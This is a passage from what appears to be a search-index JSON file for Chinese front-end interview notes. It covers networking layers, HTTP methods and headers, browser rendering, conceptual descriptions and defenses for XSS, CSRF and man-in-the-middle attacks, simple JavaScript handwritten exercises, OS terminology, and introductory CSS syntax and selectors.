网络层\",\"slug\":\"_5-网络层\",\"contents\":[\"两台计算机之间传送数据时其通信链路往往不止一条，所传输的信息甚至可能经过很多通信子网\",\"网络层的主要任务就是选择合适的网间路由和交换节点，确保数据按时成功传送\",\"在发送数据时，网络层把传输层产生的报文或用户数据报封装成分组和包，向下传输到数据链路层\",\"在网络层使用的协议是无连接的网际协议（Internet Protocol）和许多路由协议，因此我们通常把该层简单地称为 IP 层\",\"为数据包选择路由\"]},{\"header\":\"6. 数据链路层\",\"slug\":\"_6-数据链路层\",\"contents\":[\"数据链路层，在物理层和网络层之间。两台主机之间的数据传输，总是在一段一段的链路上传送的，这就需要使用专门的链路层协议\",\"在两个相邻节点之间传送数据时，数据链路层将网络层交下来的 IP 数据报组装成帧，在两个相邻节点间的链路上传送帧\",\"每一帧的数据可以分成：报头head和数据data两部分:\",\"head 标明数据发送者、接受者、数据类型，如 MAC地址\",\"data 存储了计算机之间交互的数据\",\"通过控制信息我们可以知道一个帧的起止比特位置，此外，也能使接收端检测出所收到的帧有无差错，如果发现差错，数据链路层能够简单的丢弃掉这个帧，以避免继续占用网络资源\",\"传输有地址的帧以及错误检测功能\"]},{\"header\":\"7. 物理层\",\"slug\":\"_7-物理层\",\"contents\":[\"作为 OSI 参考模型中最低的一层，物理层的作用是实现计算机节点之间比特流的透明传送\",\"该层的主要任务是确定与传输媒体的接口的一些特性（机械特性、电气特性、功能特性，过程特性）\",\"该层主要是和硬件有关，与软件关系不大\",\"以二进制数据形式在物理媒体上传输数据\"]},{\"header\":\"4. TCP/IP五层模型\",\"slug\":\"_4-tcp-ip五层模型\",\"contents\":[\"TCP/IP模型比OSI模型更加简洁，它把应用层/表示层/会话层全部整合为了应用层\"]},{\"header\":\"5. GET和POST请求的区别\",\"slug\":\"_5-get和post请求的区别\",\"contents\":[\"应用场景：GET 请求是一个幂等的请求，GET请求一般用于对服务器资源不会产生影响的场景，比如说请求一个网页的资源。而 Post 不是一个幂等的请求，POST请求一般用于对服务器资源会产生影响的情景，比如注册用户这一类的操作\",\"是否缓存：因为两者应用场景不同，浏览器一般会对 Get 请求缓存，但很少对 Post 请求缓存\",\"发送的报文格式：Get 请求的报文中实体部分为空，Post 请求的报文中实体部分一般为向服务器发送的数据\",\"安全性：Get 请求可以将请求的参数放入 url 中向服务器发送，这样的做法相对于 Post 请求来说是不太安全的，因为请求的 url 会被保留在历史记录中\",\"请求长度：浏览器由于对 url 长度的限制，所以会影响 get 请求发送数据时的长度。这个限制是浏览器规定的\",\"参数类型：post 的参数传递支持更多的数据类型\"]},{\"header\":\"6. POST和PUT请求的区别\",\"slug\":\"_6-post和put请求的区别\",\"contents\":[\"PUT请求是向服务器端发送数据，从而修改数据的内容，但是不会增加数据的种类等，也就是说无论进行多少次PUT操作，其结果并没有不同（可以理解为更新数据）\",\"POST请求是向服务器端发送数据，该请求会改变数据的种类等资源，它会创建新的内容（可以理解为是创建数据）\"]},{\"header\":\"7. 常见的HTTP请求头和响应头\",\"slug\":\"_7-常见的http请求头和响应头\",\"contents\":[\"HTTP Request Header 常见的请求头：\",\"Accept:浏览器能够处理的内容类型\",\"Accept-Charset:浏览器能够显示的字符集\",\"Accept-Encoding：浏览器能够处理的压缩编码\",\"Accept-Language：浏览器当前设置的语言\",\"Connection：浏览器与服务器之间连接的类型\",\"Cookie：当前页面设置的任何Cookie\",\"Host：发出请求的页面所在的域\",\"Referer：发出请求的页面的URL\",\"User-Agent：浏览器的用户代理字符串\",\"HTTP Responses Header 常见的响应头：\",\"Date：表示消息发送的时间，时间的描述格式由rfc822定义\",\"server:服务器名称\",\"Connection：浏览器与服务器之间连接的类型\",\"Cache-Control：控制HTTP缓存\",\"content-type:表示后面的文档属于什么MIME类型\"]},{\"header\":\"8. HTTP状态码304是多好还是少好\",\"slug\":\"_8-http状态码304是多好还是少好\",\"contents\":[\"服务器为了提高网站访问速度，对之前访问的部分页面指定缓存机制，当客户端在此对这些页面进行请求，服务器会根据缓存内容判断页面与之前是否相同，若相同便直接返回304，此时客户端调用缓存内容，不必进行二次下载\",\"产生较多304状态码的原因：\",\"页面更新周期长或不更新\",\"纯静态页面或强制生成静态html\",\"304状态码出现过多会造成以下问题：\",\"网站快照停止\",\"收录减少\",\"权重下降\"]}]},\"/front-end/Interview-notes/08-%E9%9D%A2%E8%AF%95%E7%AC%94%E8%AE%B0-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%8E%9F%E7%90%86.html\":{\"title\":\"浏览器原理\",\"contents\":[{\"header\":\"1. 浏览器的渲染过程\",\"slug\":\"_1-浏览器的渲染过程\",\"contents\":[]},{\"header\":\"1. 基本过程\",\"slug\":\"_1-基本过程\",\"contents\":[\"解析HTML的所有标签，深度遍历生成DOM树\",\"解析CSS，构建层叠样式表模型CSSOM树\",\"构建Render Tree（渲染树）\",\"DOM和CSSOM根据一定的规则组合起来生成了Render Tree\",\"布局（Layout）\",\"确定各个元素的大小、位置。浏览器使用一种流式处理的方法，只需要一次绘制操作就可以布局所有的元素\",\"绘制（Painting）\",\"浏览器会遍历Render Tree渲染树，调用paint方法，将渲染树的各个节点绘制到屏幕上\"]},{\"header\":\"2. 关于CSS、JS阻塞问题\",\"slug\":\"_2-关于css、js阻塞问题\",\"contents\":[\"CSS 加载会不会阻塞 JS 的加载？（不会）\",\"CSS 加载会不会阻塞 JS 的执行？（会）\",\"CSS 加载会不会阻塞 DOM 的解析？（不会）\",\"CSS 加载会不会阻塞 DOM 的渲染？（会）\",\"JS 加载会不会阻塞 DOM 的解析？（会）\",\"JS 加载会不会阻塞 DOM 的渲染？（会）\",\"JS 执行会不会阻塞 DOM 的解析？（会）\",\"JS 执行会不会阻塞 DOM 的渲染？（会）\",\"关于 css，js 的阻塞问题，都跟浏览器的渲染进程有关。而渲染进程又是多线程的\",\"JS 引擎线程（单线程）：负责解析 Javascript 脚本，运行代码\",\"GUI 渲染线程：负责渲染浏览器界面，解析 HTML，CSS，构建 DOM Tree，CSSOM Tree 和 Render Tree，布局和绘制等\",\"注意：GUI 渲染线程与 JS 引擎线程是互斥的，当 JS 引擎执行时 GUI 线程会被挂起，所以当 JS 加载和执行时，会阻塞住 DOM 的解析和渲染，导致白屏时间很长\",\"DOM Tree 和 CSSOM Tree 是并行构建的，所以 CSS 加载不会阻塞 DOM 的解析；由于 Render Tree 是依赖于 DOM Tree 和 CSSOM Tree 的，因此，CSS 加载会阻塞 DOM 的渲染\",\"GUI 渲染线程与 JS 引擎线程是互斥的，加载解析 CSS 时，JS 引擎会被挂起，所以 CSS 会阻塞 JS 的执行\",\"如果遇到普通（sync）JavaScript脚本加载：文档解析的过程中，如果遇到JavaScript脚本，就会停止页面的解析进行下载，当脚本都执行完毕后，才会继续解析页面\",\"如果遇到异步（async）JavaScript脚本加载：异步脚本会在HTML加载和解析完毕后执行\",\"如果遇到设置了推迟的JavaScript脚本加载：文档解析时，遇到设置了defer的脚本，就会在后台进行下载，但是并不会阻止文档的渲染，当页面解析和渲染完毕后，会等到所有的defer脚本加载完毕并按照顺序执行完毕才会触发\",\"defer是“渲染完再执行”：依赖于页面中的DOM元素（文档是否解析完毕），或者被其他脚本文件依赖\",\"**async是“下载完就执行”：**并不关心页面中的DOM元素（文档是否解析完毕），并且也不会产生其他脚本需要的数据\"]},{\"header\":\"2. XSS攻击\",\"slug\":\"_2-xss攻击\",\"contents\":[]},{\"header\":\"1. 什么是XSS攻击\",\"slug\":\"_1-什么是xss攻击\",\"contents\":[\"XSS 攻击指的是跨站脚本攻击，是一种代码注入攻击。攻击者通过在网站注入恶意脚本，使之在用户的浏览器上运行，从而盗取用户的信息如 cookie 等\",\"XSS 的本质是因为网站没有对恶意代码进行过滤，与正常的代码混合在一起了，浏览器没有办法分辨哪些脚本是可信的，从而导致了恶意代码的执行\"]},{\"header\":\"2. 攻击类型\",\"slug\":\"_2-攻击类型\",\"contents\":[\"XSS 可以分为存储型、反射型和 DOM 型：\",\"存储型指的是恶意脚本会存储在目标服务器上，当浏览器请求数据时，脚本从服务器传回并执行 \",\"常见于带有用户保存数据的网站功能，如论坛发帖、商品评论、用户私信等\",\"反射型指的是攻击者诱导用户访问一个带有恶意代码的 URL 后，服务器端接收数据后处理，然后把带有恶意代码的数据发送到浏览器端，浏览器端解析这段带有 XSS 代码的数据后当做脚本执行，最终完成 XSS 攻击 \",\"常见于通过 URL 传递参数的功能，如网站搜索、跳转等\",\"DOM 型指的通过修改页面的 DOM 节点形成的 XSS \",\"DOM 型 XSS 跟前两种 XSS 的区别：DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端JavaScript自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞\"]},{\"header\":\"3. 防御XSS攻击\",\"slug\":\"_3-防御xss攻击\",\"contents\":[\"使用HTTP Only Cookie：将敏感信息存储在HTTP Only Cookie中，这样浏览器脚本无法访问或修改这些Cookie。这可以有效防止XSS攻击者窃取用户的身份验证信息\",\"Content Security Policy（CSP）：通过CSP设置一系列策略（即白名单），限制页面中可以执行的内容来源，包括脚本、样式和其他资源\",\"输入验证：要对用户输入的数据进行验证和过滤，确保只接受预期格式和合法字符。使用服务器端验证来拒绝恶意脚本或特殊字符\",\"输出转义：对需要插入到HTML中的代码进行转义\"]},{\"header\":\"3. CSRF攻击\",\"slug\":\"_3-csrf攻击\",\"contents\":[]},{\"header\":\"1. 什么是CSRF攻击\",\"slug\":\"_1-什么是csrf攻击\",\"contents\":[\"CSRF 攻击指的是跨站请求伪造攻击，攻击者诱导用户进入一个第三方网站，然后该网站向被攻击网站发送跨站请求。如果用户在被攻击网站中保存了登录状态，那么攻击者就可以利用这个登录状态，绕过后台的用户验证，冒充用户向服务器执行一些操作\",\"CSRF 攻击的本质是利用 cookie 会在同源请求中携带发送给服务器的特点，以此来实现用户的冒充\",\"必要条件：\",\"登录受信任网站A，并在本地生成Cookie。（如果用户没有登录网站A，那么网站B在诱导的时候，请求网站A的api接口时，会提示你登录）\",\"在不登出A的情况下，访问危险网站B（其实是利用了网站A的漏洞）\"]},{\"header\":\"2. 攻击类型\",\"slug\":\"_2-攻击类型-1\",\"contents\":[\"常见的 CSRF 攻击有三种：\",\"GET 类型的 CSRF 攻击，比如在网站中的一个 img 标签里构建一个请求，当用户打开这个网站的时候就会自动发起提交\",\"POST 类型的 CSRF 攻击，比如构建一个表单，然后隐藏它，当用户进入页面时，自动提交这个表单\",\"链接类型的 CSRF 攻击，比如在 a 标签的 href 属性里构建一个请求，然后诱导用户去点击\"]},{\"header\":\"3. 防御CSRF攻击\",\"slug\":\"_3-防御csrf攻击\",\"contents\":[\"token验证\",\"进行同源检测，根据HTTP请求头中的referer信息验证\",\"对cookie进行双重验证\",\"在设置cookie时设置samesite，限制cookie不可能作为第三方cookie使用\"]},{\"header\":\"4. 中间人攻击\",\"slug\":\"_4-中间人攻击\",\"contents\":[]},{\"header\":\"1. 什么是中间人攻击\",\"slug\":\"_1-什么是中间人攻击\",\"contents\":[\"中间人攻击 (Man-in-the-middle attack, MITM) 是指攻击者与通讯的两端分别创建独立的联系, 并交换其所收到的数据, 使通讯的两端认为他们正在通过一个私密的连接与对方直接对话, 但事实上整个会话都被攻击者完全控制。在中间人攻击中，攻击者可以拦截通讯双方的通话并插入新的内容\"]},{\"header\":\"2. 如何防范\",\"slug\":\"_2-如何防范\",\"contents\":[\"使用安全信道\",\"使用加密通信\"]},{\"header\":\"5. 可能引起前端安全问题的情况\",\"slug\":\"_5-可能引起前端安全问题的情况\",\"contents\":[\"跨站脚本 (Cross-Site Scripting, XSS): ⼀种代码注入方式, 为了与 CSS 区分所以被称作 XSS。早期常见于网络论坛, 起因是网站没有对用户的输入进行严格的限制, 使得攻击者可以将脚本上传到帖子让其他人浏览到有恶意脚本的页面, 其注入方式很简单包括但不限于 JavaScript / CSS / Flash 等\",\"iframe的滥用: iframe中的内容是由第三方来提供的，默认情况下他们不受控制，他们可以在iframe中运行JavaScirpt脚本、Flash插件、弹出对话框等等，这可能会破坏前端用户体验\",\"跨站点请求伪造（Cross-Site Request Forgeries，CSRF）: 指攻击者通过设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或设定信息等某些状态更新，属于被动攻击\",\"恶意第三方库: 无论是后端服务器应用还是前端应用开发，绝大多数时候都是在借助开发框架和各种类库进行快速开发，一旦第三方库被植入恶意代码很容易引起安全问题\"]}]},\"/front-end/Interview-notes/09-%E9%9D%A2%E8%AF%95%E7%AC%94%E8%AE%B0-%E6%89%8B%E5%86%99%E4%BB%A3%E7%A0%81.html\":{\"title\":\"手写题\",\"contents\":[{\"header\":\"1. CSS实现梯形、三角形、扇形、圆形、半圆\",\"slug\":\"_1-css实现梯形、三角形、扇形、圆形、半圆\",\"contents\":[]},{\"header\":\"1. 梯形\",\"slug\":\"_1-梯形\",\"contents\":[]},{\"header\":\"2. 三角形\",\"slug\":\"_2-三角形\",\"contents\":[]},{\"header\":\"3. 扇形\",\"slug\":\"_3-扇形\",\"contents\":[]},{\"header\":\"4. 圆形\",\"slug\":\"_4-圆形\",\"contents\":[]},{\"header\":\"5. 半圆\",\"slug\":\"_5-半圆\",\"contents\":[]},{\"header\":\"2. 标签相关操作\",\"slug\":\"_2-标签相关操作\",\"contents\":[]},{\"header\":\"1. 获取标签\",\"slug\":\"_1-获取标签\",\"contents\":[\"document.getElementById('id')// 全局唯一 document.getElementByClassName('className')// 获得数组 document.getElementByTagName('div')// 获得数组 \"]},{\"header\":\"2. 插入标签\",\"slug\":\"_2-插入标签\",\"contents\":[\"let head = document.head; let style = document.createElement('style'); style.type = 'text/css'; style.innerHTML = 'p {color: red;}'; head.appendChild(style); \"]},{\"header\":\"3. 让盒子充满屏幕\",\"slug\":\"_3-让盒子充满屏幕\",\"contents\":[\"div{ background-color:red; width:100vw; height:100vh; } \"]},{\"header\":\"4. 手写Object.create\",\"slug\":\"_4-手写object-create\",\"contents\":[\"Object.create() 静态方法以一个现有对象作为原型（prototype），创建一个新对象\",\"思路：将传入的对象作为原型（prototype）\",\"function myCreate(obj) { // 定义一个构造函数 function F() {} // 给构造函数的原型赋值 F.prototype = obj; // 返回构造函数的实例 return new F(); } \",\"示例：\",\"let person = { age: 18 }; let child = Object.create(person); console.log(child); let child1 = myCreate(person); console.log(child1); \"]},{\"header\":\"5. 手写instanceof方法\",\"slug\":\"_5-手写instanceof方法\",\"contents\":[\"instanceof 运算符用于检测构造函数的 prototype 属性是否出现在某个实例对象的原型链上\",\"function myInstanceof(target, origin) { const op = origin.prototype; let tp = target.__proto__; while (true) { if (tp === null) { return false; } if (tp === op) { return true; } tp = tp.__proto__; } } \",\"示例：\",\"let arr = [1, 2, 3]; console.log(myInstanceof(arr, Array)); \"]},{\"header\":\"6. 手写new操作符\",\"slug\":\"_6-手写new操作符\",\"contents\":[\"在调用 new 的过程中会发生以下四件事情：\",\"首先创建了一个新的空对象\",\"设置原型，将对象的原型设置为函数的 prototype 对象\",\"让函数的 this 指向这个对象，执行构造函数的代码（为这个新对象添加属性）\",\"判断函数的返回值类型，如果是值类型，返回创建的对象。如果是引用类型，就返回这个引用类型的对象\",\"function myNew(constructor, ...args) { // 新建一个空对象 const obj = {}; // 对象原型为构造函数的prototype obj.__proto__ = constructor.prototype; // 将this指向新建对象 const result = constructor.apply(obj, args); // 判断函数的返回值类型，如果是值类型，返回创建的对象。如果是引用类型，就返回这个引用类型的对象 if ( result && (typeof result === 'object' || typeof result === 'function') ) { return result; } return obj; } \",\"示例：\",\"function Person(name, age) { this.name = name; this.age = age; } console.log(new Person('李四', 18)); console.log(myNew(Person, '张三', 19)); \"]},{\"header\":\"7. 手写promise\",\"slug\":\"_7-手写promise\",\"contents\":[\"详见：手写Promise\"]}]},\"/front-end/Interview-notes/10-%E9%9D%A2%E8%AF%95%E7%AC%94%E8%AE%B0-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F.html\":{\"title\":\"操作系统\",\"contents\":[{\"header\":\"1. 对操作系统的理解\",\"slug\":\"_1-对操作系统的理解\",\"contents\":[]},{\"header\":\"1. 操作系统是什么\",\"slug\":\"_1-操作系统是什么\",\"contents\":[\"操作系统（Operating System，缩写：OS）是一组主管并控制计算机操作、运用和运行硬件、软件资源和提供公共服务来组织用户交互的相互关联的系统软件程序，同时也是计算机系统的内核与基石\",\"简单来讲，操作系统就是一种复杂的软件，相当于软件管家\",\"操作系统需要处理如管理与配置内存、决定系统资源供需的优先次序、控制输入与输出设备、操作网络与管理文件系统等基本事务\",\"操作系统的类型非常多样，不同机器安装的操作系统可从简单到复杂，可从移动电话的嵌入式系统到超级电脑的大型操作系统，在计算机与用户之间起接口的作用\",\"许多操作系统制造者对它涵盖范畴的定义也不尽一致，例如有些操作系统集成了图形用户界面，而有些仅使用命令行界面，将图形用户界面视为一种非必要的应用程序\"]},{\"header\":\"2. 核心概念\",\"slug\":\"_2-核心概念\",\"contents\":[\"操作系统的核心概念都是对具体物理硬件的抽象，主要有如下：\",\"进程（线程）：进程（线程）是操作系统对CPU的抽象\",\"虚拟内存（地址空间）：虚拟内存是操作系统对物理内存的抽象\",\"文件：文件是操作系统对物理磁盘的抽象\",\"shell：它是一个程序，可从键盘获取命令并将其提供给操作系统以执行。\",\"GUI ：是一种用户界面，允许用户通过图形图标和音频指示符与电子设备进行交互\",\"计算机架构(computer architecture)： 在计算机工程中，计算机体系结构是描述计算机系统功能，组织和实现的一组规则和方法。它主要包括指令集、内存管理、I/O 和总线结构\",\"多处理系统(Computer multitasking)：是指计算机同时运行多个程序的能力\",\"程序计数器(Program counter)：程序计数器 是一个 CPU 中的寄存器，用于指示计算机在其程序序列中的位置\",\"多线程(multithreading)：是指从软件或者硬件上实现多个线程并发执行的技术\",\"CPU 核心(core)：它是 CPU 的大脑，它接收指令，并执行计算或运算以满足这些指令。一个 CPU 可以有多个内核\",\"图形处理器(Graphics Processing Unit)：又称显示核心、视觉处理器、显示芯片或绘图芯片\",\"缓存命中(cache hit)：当应用程序或软件请求数据时，会首先发生缓存命中\",\"RAM((Random Access Memory)：随机存取存储器，也叫主存，是与 CPU 直接交换数据的内部存储器\",\"ROM (Read Only Memory)：只读存储器是一种半导体存储器，其特性是一旦存储数据就无法改变或删除\",\"虚拟地址(virtual memory)： 虚拟内存是计算机系统内存管理的一种机制\",\"驱动程序(device driver)：设备驱动程序，简称驱动程序（driver），是一个允许高级别电脑软件与硬件交互的程序\",\"USB(Universal Serial Bus)：是连接计算机系统与外部设备的一种串口总线标准，也是一种输入输出接口的技术规范\",\"地址空间(address space)：地址空间是内存中可供程序或进程使用的有效地址范围\",\"进程间通信(interprocess communication)： 指至少两个进程或线程间传送数据或信号的一些技术或方法\",\"目录(directory)： 在计算机或相关设备中，一个目录或文件夹就是一个装有数字文件系统的虚拟容器\",\"路径(path name)： 路径是一种电脑文件或目录的名称的通用表现形式，它指向文件系统上的一个唯一位置。\",\"根目录(root directory)：根目录指的就是计算机系统中的顶层目录，比如 Windows 中的 C 盘和 D 盘，Linux 中的 /\",\"工作目录(Working directory)：它是一个计算机用语。用户在操作系统内所在的目录，用户可在此目录之下，用相对文件名访问文件。\",\"文件描述符(file descriptor)： 文件描述符是计算机科学中的一个术语，是一个用于表述指向文件的引用的抽象化概念\",\"客户端(clients)：客户端是访问服务器提供的服务的计算机硬件或软件。\",\"服务端(servers)： 在计算中，服务器是为其他程序或设备提供功能的计算机程序或设备\"]},{\"header\":\"3. 总结\",\"slug\":\"_3-总结\",\"contents\":[\"操作系统是管理计算机硬件与软件资源的程序，是计算机的基石\",\"操作系统本质上是一个运行在计算机上的软件程序 ，用于管理计算机硬件和软件资源\",\"操作系统存在屏蔽了硬件层的复杂性。 操作系统就像是硬件使用的负责人，统筹着各种相关事项\",\"操作系统的内核（Kernel）是操作系统的核心部分，它负责系统的内存管理，硬件设备的管理，文件系统的管理以及应用程序的管理。 内核是连接应用程序和硬件的桥梁，决定着系统的性能和稳定性\"]}]},\"/front-end/Interview-notes/\":{\"title\":\"面试笔记\",\"contents\":[]},\"/front-end/css-notes/01-%E5%88%9D%E8%AF%86CSS.html\":{\"title\":\"初识CSS\",\"contents\":[{\"header\":\"1. CSS简介\",\"slug\":\"_1-css简介\",\"contents\":[\"CSS 是层叠样式表 ( Cascading Style Sheets ) 的简称，有时我们也会称之为 CSS样式表 或 级联样式表\",\"CSS 也是一种标记语言\",\"CSS 主要用于设置 HTML 页面中的文本内容（字体、大小、对齐方式等）、图片的外形（宽高、边框样式、边距等）以及版面的布局和外观显示样式\",\"CSS 让我们的网页更加丰富多彩，布局更加灵活自如，简单理解：CSS 可以美化 HTML , 让 HTML 更漂亮，让页面布局更简单\",\"CSS 最大价值: 由 HTML 专注去做结构呈现，样式交给 CSS，即结构 ( HTML ) 与样式 ( CSS ) 相分离\"]},{\"header\":\"2. CSS的引入方式\",\"slug\":\"_2-css的引入方式\",\"contents\":[\"按照 CSS 样式书写的位置（或者引入的方式），CSS 样式表可以分为三大类\"]},{\"header\":\"1. 行内样式表（行内式）\",\"slug\":\"_1-行内样式表-行内式\",\"contents\":[\"行内样式表（内联样式表）是在元素标签内部的 style 属性中设定 CSS 样式。适合于修改简单样式\",\"语法：\",\"<div style=\\\"样式\\\"></div> \",\"style 其实就是标签的属性，在双引号中间，写法要符合 CSS 规范，是 名：值 的形式\",\"可以控制当前的标签设置样式\",\"由于书写繁琐，并且没有体现出结构与样式相分离的思想，所以不推荐大量使用，只有对当前元素添加简单样式的时候，可以考虑使用\",\"使用行内样式表设定 CSS，通常也被称为行内式引入\"]},{\"header\":\"2. 内部样式表（嵌入式）\",\"slug\":\"_2-内部样式表-嵌入式\",\"contents\":[\"内部样式表（内嵌样式表）是写到 html 页面内部，是将所有的 CSS 代码抽取出来，单独放到一个 <style> 标签中\",\"语法：\",\"<style> /*样式*/ </style> \",\"<style> 标签理论上可以放在 HTML 文档的任何地方，但一般会放在文档的 <head> 标签中\",\"通过此种方式，可以方便控制当前整个页面中的元素样式设置\",\"代码结构清晰，但是并没有实现结构与样式完全分离\",\"使用内部样式表设定 CSS，通常也被称为嵌入式引入，这种方式是我们练习时常用的方式\"]},{\"header\":\"3. 外部样式表（链接式）\",\"slug\":\"_3-外部样式表-链接式\",\"contents\":[\"实际开发都是外部样式表，适合于样式比较多的情况，核心是: 样式单独写到 .css 文件中，之后把 .css 文件引入到 HTML 页面中使用\",\"引入外部样式表分为两步：\",\"新建一个后缀名为 .css 的样式文件，把所有 CSS 代码都放入此文件中\",\"在 HTML 页面中，使用 <link> 标签引入这个文件\",\"语法：\",\"<link rel=\\\"stylesheet\\\" href=\\\"css文件路径\\\"> \",\"注意：\",\"<link> 标签要写在 <head> 标签中\",\"标签属性说明： \",\"href ：引入的文档来自于哪里\",\"rel ：( relation，关系）说明引入的文档与当前文档之间的关系\",\"外部样式的优势：样式可以复用、结构清晰、可触发浏览器的缓存机制，提高访问速度，实现了结构与样式的完全分离\",\"实际开发中，几乎都使用外部样式，这是最推荐的使用方式\"]},{\"header\":\"4. CSS引入方式总结\",\"slug\":\"_4-css引入方式总结\",\"contents\":[\"样式表\",\"优点\",\"缺点\",\"使用情况\",\"控制范围\",\"行内样式表\",\"书写方便，权重高\",\"结构样式混写\",\"较少\",\"控制一个标签\",\"内部样式表\",\"部分结构和样式相分离\",\"没有彻底分离\",\"较多\",\"控制一个页面\",\"外部样式表\",\"完全实现结构和样式相分离\",\"需要引入\",\"最多\",\"控制多个页面\"]},{\"header\":\"5. 样式表的优先级\",\"slug\":\"_5-样式表的优先级\",\"contents\":[\"优先级规则：行内样式 > 内部样式 = 外部样式\",\"内部样式、外部样式，这二者的优先级相同，且：后面的会覆盖前面的（简记：“后来者居上”）\",\"同一个样式表中，优先级也和编写顺序有关，且：后面的会覆盖前面的（简记：“后来者居上”）\"]},{\"header\":\"3. CSS语法规范\",\"slug\":\"_3-css语法规范\",\"contents\":[\"CSS 规则由两个主要的部分构成：\",\"选择器：找到要添加样式的元素\",\"声明块：设置具体的样式（声明块是由一个或多个声明组成的），声明的格式为： 属性名: 属性值;\",\"h1{ color:red; font-size:25px; } /*h1是选择器*/ \",\"选择器是用于指定 CSS 样式的 HTML 标签，花括号内是对该对象设置的具体样式\",\"属性和属性值以“键值对”的形式出现\",\"属性是对指定的对象设置的样式属性，例如字体大小、文本颜色等\",\"属性和属性值之间用英文:分开\",\"多个“键值对”之间用英文;进行区分\",\"例如：所有的样式，都包含在 <style> 标签内，表示是样式表。<style> 一般写到 </head> 上方\",\"<head> <style> h4 { color: blue; font-size: 100px; } </style> </head> \",\"注释的写法：\",\"/* 给h1元素添加样式 */ h1{ /* 设置文字颜色为红色 */ color: red; /* 设置文字大小为40px */ font-size: 40px; } \"]},{\"header\":\"4. CSS代码风格\",\"slug\":\"_4-css代码风格\",\"contents\":[\"样式格式书写\",\"紧凑格式（项目上线时推荐，可减小文件体积）\",\"h3 { color: deeppink; font-size: 20px;} \",\"展开格式（开发时推荐，便于维护和调试）\",\"h3 { color: pink; font-size: 20px; } \",\"样式大小写风格\",\"小写格式（强烈推荐样式选择器，属性名，属性值关键字全部使用小写字母，特殊情况除外）\",\"h3 { color: pink; } \",\"大写格式：\",\"H3 { COLOR: PINK; } \",\"样式空格风格\",\"属性值前面，冒号后面，保留一个空格，选择器（标签）和大括号中间保留空格\",\"h3 { color: pink; } \"]}]},\"/front-end/css-notes/02-CSS%E9%80%89%E6%8B%A9%E5%99%A8.html\":{\"title\":\"CSS选择器\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"选择器 (选择符)就是根据不同需求把不同的标签选出来，简单来说，就是选择标签用的\"]},{\"header\":\"1. CSS基础选择器\",\"slug\":\"_1-css基础选择器\",\"contents\":[\"基础选择器包括：\",\"通配符选择器\",\"标签（元素）选择器\",\"类选择器\",\"id 选择器\"]},{\"header\":\"1. 通配符选择器\",\"slug\":\"_1-通配符选择器\",\"contents\":[\"作用：可以选中所有的 HTML 元素\",\"语法：\",\"* { 属性名: 属性值; } \",\"例：\",\"* { margin: 0; padding: 0; } \"]},{\"header\":\"2. 标签选择器\",\"slug\":\"_2-标签选择器\",\"contents\":[\"标签选择器（元素选择器）是指用 HTML 标签名称作为选择器，按标签名称分类，为页面中某一类标签指定统一的 CSS 样式\",\"作用：为页面中某种元素统一设置样式\",\"语法：\",\"标签名{ 属性名：属性值 } \",\"例：\",\"/* 选中所有h1元素 */ h1 { color: orange; font-size: 40px; } /* 选中所有p元素 */ p { color: blue; font-size: 60px; } \"]},{\"header\":\"3. 类选择器\",\"slug\":\"_3-类选择器\",\"contents\":[\"如果想要差异化选择不同的标签，单独选一个或者某几个标签，可以使用类选择器\",\"作用：根据元素的 class 值，来选中某些元素\",\"语法：\",\".类名 { 属性名: 属性值; } \",\"例：\",\"/* 选中所有class值为speak的元素 */ .speak { color: red; } /* 选中所有class值为answer的元素 */ .answer { color: blue; } \",\"如果想要差异化选择不同的标签，单独选一个或者某几个标签，可以使用类选择器\",\"类选择器在 HTML 中以 class 属性表示，在 CSS 中，类选择器以一个点号 . 显示\",\"类选择器使用.（英文点号）进行标识，后面紧跟类名（自定义，我们自己命名的）\",\"可以理解为给这个标签起了一个名字，来表示\",\"长名称或词组可以使用中横线来为选择器命名\",\"不要使用纯数字、中文等命名，尽量使用英文字母来表示\",\"命名要有意义，尽量使别人一眼就知道这个类名的目的\",\"注意：在标签 class 属性中可以写多个类名，多个类名中间必须用空格分开，这个标签就可以分别具有这些类名的样式\"]},{\"header\":\"4. id选择器\",\"slug\":\"_4-id选择器\",\"contents\":[\"id 选择器可以为标有特定 id 的 HTML 元素指定特定的样式\",\"作用：根据元素的 id 属性值，来精准的选中某个元素\",\"语法：\",\"#id值 { 属性名: 属性值; } \",\"例：\",\"/* 选中id值为earthy的那个元素 */ #earthy { color: red; font-size: 60px; } \",\"注意：\",\"id 属性值：尽量由字母、数字、下划线 _ 、短杠 - 组成，最好以字母开头、不要包含空格、区分大小写\",\"一个元素只能拥有一个 id 属性，多个元素的 id 属性值不能相同\",\"一个元素可以同时拥有 id 和 class 属性\"]},{\"header\":\"5. 选择器总结\",\"slug\":\"_5-选择器总结\",\"contents\":[\"基础选择器\",\"作用\",\"特点\",\"使用情况\",\"用法\",\"标签选择器\",\"可以选出所有相同的标签\",\"不能差异化选择\",\"较多\",\"p{color: red};\",\"类选择器\",\"可以选出 1 个或多个标签\",\"可以根据需求选择\",\"非常多\",\". nav{color: red;}\",\"id 选择器\",\"一次只能选择 1 个标签\",\"ID 属性只能在每个 HTML 文档中出现一次\",\"一般和 js 搭配\",\"# nav{color: red;}\",\"通配符选择器\",\"选择所有的标签\",\"选择的太多，有部分不需要\",\"特殊情况使用\",\"* {color: red;}\"]},{\"header\":\"2. CSS复合选择器\",\"slug\":\"_2-css复合选择器\",\"contents\":[\"在 CSS 中，可以根据选择器的类型把选择器分为基础选择器和复合选择器，复合选择器是建立在基础选择器之上，对基本选择器进行组合形成的\",\"复合选择器是由两个或多个基础选择器，通过不同的方式组合而成的，可以更准确、更高效的选择目标元素（标签）\",\"常用的复合选择器包括：\",\"交集选择器\",\"并集选择器\",\"后代选择器\",\"子元素选择器\",\"兄弟选择器\",\"属性选择器\",\"伪类选择器\",\"伪元素选择器\",\"……\"]},{\"header\":\"1. 交集选择器\",\"slug\":\"_1-交集选择器\",\"contents\":[\"作用：选中同时符合多个条件的元素\",\"语法：\",\"选择器1选择器2选择器3...选择器n { 样式声明 } \",\"例：\",\"/* 选中类名为beauty的p元素，此种写法用的非常多 */ p.beauty { color: blue; } /* 选中：类名包含rich和beauty的元素 */ .rich.beauty { color: green; } \",\"注意：\",\"有标签名，标签名必须写在前面\",\"id 